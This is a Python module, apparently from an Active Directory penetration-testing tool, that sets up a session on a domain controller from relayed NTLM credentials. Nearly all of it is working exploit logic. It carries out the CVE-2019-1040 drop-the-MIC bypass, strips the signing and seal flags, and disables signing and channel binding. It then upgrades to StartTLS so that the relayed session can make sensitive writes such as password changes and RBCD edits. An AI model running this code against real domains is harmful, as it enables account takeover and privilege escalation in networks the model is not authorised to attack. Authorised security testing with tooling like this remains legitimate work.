"""Shared relay-mode LDAP session establishment (single source of truth).

This module owns the *one* canonical way ADscan stands up an authenticated
LDAP session from a relayed NTLM context. Every relay LDAP target
(add-computer, RBCD modify, future shadow-credentials modify, ...) consumes
:func:`establish_relay_ldap_session` rather than re-inlining the bind dance.

Flow
----
1. Extract the raw ``NTLMRelayHandler`` from the relay GSSAPI context — SICILY
   needs raw NTLM bytes, not SPNEGO wrapping.
2. Strip signing/seal flags (``force_signdisable``) and zero the MIC in the
   AUTHENTICATE message via ``modify_authenticate_cb`` — this is the
   CVE-2019-1040 / drop-the-MIC behaviour (``_strip_mic`` below). Without it
   the DC enables LDAP signing after the bind and subsequent ops arrive
   encrypted, breaking the relay.
3. Open a raw TCP connection to the DC's LDAP port (389 by default — LDAPS
   enforces channel binding which is incompatible with NTLM relay).
4. Bind via the injected relay handler, then upgrade to TLS via StartTLS so
   the DC will accept sensitive writes (e.g. ``unicodePwd``). StartTLS
   (RFC 2830) does NOT enforce channel binding unlike LDAPS, so it works fine
   with a relay-authenticated session. badldap resets status → CONNECTED after
   wrapping SSL; we restore RUNNING (= bound) so subsequent ops succeed.
5. Build the high-level ``MSLDAPClient`` and populate ``serverinfo`` / tree /
   ``ad_info`` so callers can derive the base DN.

Returns ``(client, raw_conn, base_dn)``. Raises on any failure so the caller
can wrap it in a ``RelayTargetResult``.
"""

from __future__ import annotations

import asyncio
from typing import Any

from adscan_internal.rich_output import mark_sensitive, print_info_debug


async def establish_relay_ldap_session(
    *,
    gssapi: Any,
    dc_ip: str,
    domain: str,
    ldap_port: int = 389,
    disable_signing: bool = True,
) -> tuple[Any, Any, str]:
    """Stand up an authenticated relay-mode LDAP session against the DC.

    Args:
        gssapi: Completed SPNEGO/relay GSSAPI context from the relay engine.
        dc_ip: IP address of the domain controller to relay to.
        domain: AD domain name (used for display and SICILY cred construction).
        ldap_port: LDAP port. 389 only — LDAPS requires channel binding.
        disable_signing: Tell badldap not to negotiate LDAP signing. Relay
            contexts cannot sign; signing must be disabled (default ``True``).

    Returns:
        Tuple of ``(MSLDAPClient, MSLDAPClientConnection, base_dn)``. The base
        DN is the ``defaultNamingContext`` resolved from server info.

    Raises:
        RuntimeError: On any connect/bind/serverinfo/ad-info failure, or when
            the GSSAPI context has no NTLM handler.
    """
    from asysocks.unicomm.common.target import UniProto  # noqa: PLC0415
    from badauth.common.constants import asyauthProtocol, asyauthSecret  # noqa: PLC0415
    from badauth.common.credentials import UniCredential  # noqa: PLC0415
    from badauth.protocols.ntlm.structures.avpair import (  # noqa: PLC0415
        AVPAIRType,
        MsvAvFlags,
    )
    from badauth.protocols.ntlm.structures.challenge_response import (  # noqa: PLC0415
        NTLMv2Response,
    )
    from badauth.protocols.ntlm.structures.negotiate_flags import (  # noqa: PLC0415
        NegotiateFlags,
    )
    from badldap.client import MSLDAPClient  # noqa: PLC0415
    from badldap.commons.target import MSLDAPTarget  # noqa: PLC0415
    from badldap.connection import MSLDAPClientConnection  # noqa: PLC0415

    # Extract the raw NTLMRelayHandler — SICILY needs raw NTLM bytes, not SPNEGO.
    ntlm_handler = None
    if hasattr(gssapi, "authentication_contexts"):
        ntlm_handler = gssapi.authentication_contexts.get(
            "NTLMSSP - Microsoft NTLM Security Support Provider"
        )
    if ntlm_handler is None:
        raise RuntimeError("Relay GSSAPI has no NTLM context — cannot do LDAP relay")

    # Strip signing/seal flags from NEGOTIATE (force_signdisable) and zero the
    # MIC in AUTHENTICATE via modify_authenticate_cb.  This mirrors ntlmrelayx's
    # CVE-2019-1040 / remove_mic approach: without it the DC enables LDAP signing
    # after the bind and subsequent LDAP ops arrive encrypted.
    ntlm_handler.force_signdisable = True

    async def _strip_mic(auth_srv, auth_raw):  # type: ignore[misc]
        auth = auth_srv
        for flag in (
            NegotiateFlags.NEGOTIATE_ALWAYS_SIGN,
            NegotiateFlags.NEGOTIATE_SIGN,
            NegotiateFlags.NEGOTIATE_KEY_EXCH,
            NegotiateFlags.NEGOTIATE_SEAL,
        ):
            auth.NegotiateFlags &= ~flag
        auth.MIC = None
        if isinstance(auth.NTChallenge, NTLMv2Response):
            details = auth.NTChallenge.ChallengeFromClinet.Details
            if AVPAIRType.MsvAvFlags in details:
                if MsvAvFlags.MIC_PRESENT in details[AVPAIRType.MsvAvFlags]:
                    details[AVPAIRType.MsvAvFlags] &= ~MsvAvFlags.MIC_PRESENT
                    if details[AVPAIRType.MsvAvFlags] == 0:
                        del details[AVPAIRType.MsvAvFlags]
            details.pop(AVPAIRType.MsvAvSingleHost, None)
        return auth, auth.to_bytes(), None

    ntlm_handler.modify_authenticate_cb = _strip_mic

    # SICILY credential — tells badldap to use the raw-NTLM bind path (no SPNEGO),
    # avoiding signing negotiation entirely.
    sicily_cred = UniCredential(
        protocol=asyauthProtocol.SICILY,
        secret="",
        username="relay",
        domain=domain,
        stype=asyauthSecret.PASSWORD,
    )

    target = MSLDAPTarget(
        ip=dc_ip,
        port=ldap_port,
        protocol=UniProto.CLIENT_TCP,
        domain=domain,
    )

    # Inject the NTLM relay handler (not the SPNEGORelay wrapper) as the auth
    # context so SICILY's raw-token exchanges reach it directly.
    raw_conn = MSLDAPClientConnection(target, sicily_cred, auth=ntlm_handler)
    raw_conn._disable_signing = True
    raw_conn._disable_channel_binding = True

    # Connect + relayed NTLM bind, under a hard timeout.  Without it a stalled
    # relay handshake (the SMB server waiting on a CHALLENGE that the relayed
    # bind never produces — e.g. an NTLMv1 flow the handler mishandles, or an
    # unresponsive DC LDAP path) hangs the whole verb indefinitely instead of
    # failing fast.  The stage logs below pinpoint exactly where a hang occurs:
    # "connecting" with no "connected" → TCP/connect; "connected" with no
    # "bind OK" → the relayed NEGOTIATE→CHALLENGE→AUTHENTICATE handshake stalled.
    marked_dc = mark_sensitive(dc_ip, "ip")
    print_info_debug(
        f"[relay-ldap] connecting to {marked_dc}:{ldap_port} for relayed NTLM bind…"
    )
    try:
        async with asyncio.timeout(10.0):
            _, err = await raw_conn.connect()
            if err is not None:
                raise RuntimeError(f"LDAP connect to {dc_ip}:{ldap_port} failed: {err}")
            print_info_debug(
                f"[relay-ldap] connected to {marked_dc}:{ldap_port}; driving relayed "
                "NTLM bind (NEGOTIATE→CHALLENGE→AUTHENTICATE)…"
            )
            _, err = await raw_conn.bind()
            if err is not None:
                raise RuntimeError(f"LDAP relay bind failed: {err}")
    except TimeoutError as exc:
        raise RuntimeError(
            f"LDAP relay handshake to {dc_ip}:{ldap_port} timed out after 10s — "
            "the relayed NTLM bind never completed (no CHALLENGE/AUTHENTICATE "
            "round-trip). Confirm the victim's NTLM version and the DC LDAP relay "
            "path; re-run with --debug to see the last stage reached."
        ) from exc

    print_info_debug(f"[relay-ldap] relayed NTLM bind OK to {marked_dc}:{ldap_port}")

    # Upgrade to TLS via StartTLS so the DC will accept sensitive writes
    # (e.g. unicodePwd).  StartTLS (RFC 2830) does NOT enforce channel binding
    # unlike LDAPS, so it works fine with a relay-authenticated session.
    # NOTE: badldap resets status → CONNECTED after wrapping SSL; restore RUNNING
    # (= bound) so subsequent LDAP operations succeed.
    from badldap.commons.common import MSLDAPClientStatus  # noqa: PLC0415

    _tls_ok, tls_err = await raw_conn.starttls()
    if tls_err is not None:
        print_info_debug(
            f"[relay-ldap] StartTLS failed ({tls_err}), sensitive writes may not be settable"
        )
    else:
        raw_conn.status = MSLDAPClientStatus.RUNNING
        print_info_debug("[relay-ldap] StartTLS OK — TLS active")

    # Hand the authenticated connection to the high-level client.
    client = MSLDAPClient(target, sicily_cred, connection=raw_conn)
    client._disable_signing = disable_signing
    client._disable_channel_binding = True
    client.disconnected_evt = asyncio.Event()

    # Populate serverinfo / tree so callers can derive the base DN.
    serverinfo, err = await raw_conn.get_serverinfo()
    if err is not None:
        raise RuntimeError(f"get_serverinfo failed: {err}")
    client._serverinfo = serverinfo
    client._tree = serverinfo["defaultNamingContext"]
    client._ldapinfo, err = await client.get_ad_info()
    if err is not None:
        raise RuntimeError(f"get_ad_info failed: {err}")

    return client, raw_conn, client._tree


__all__ = ["establish_relay_ldap_session"]
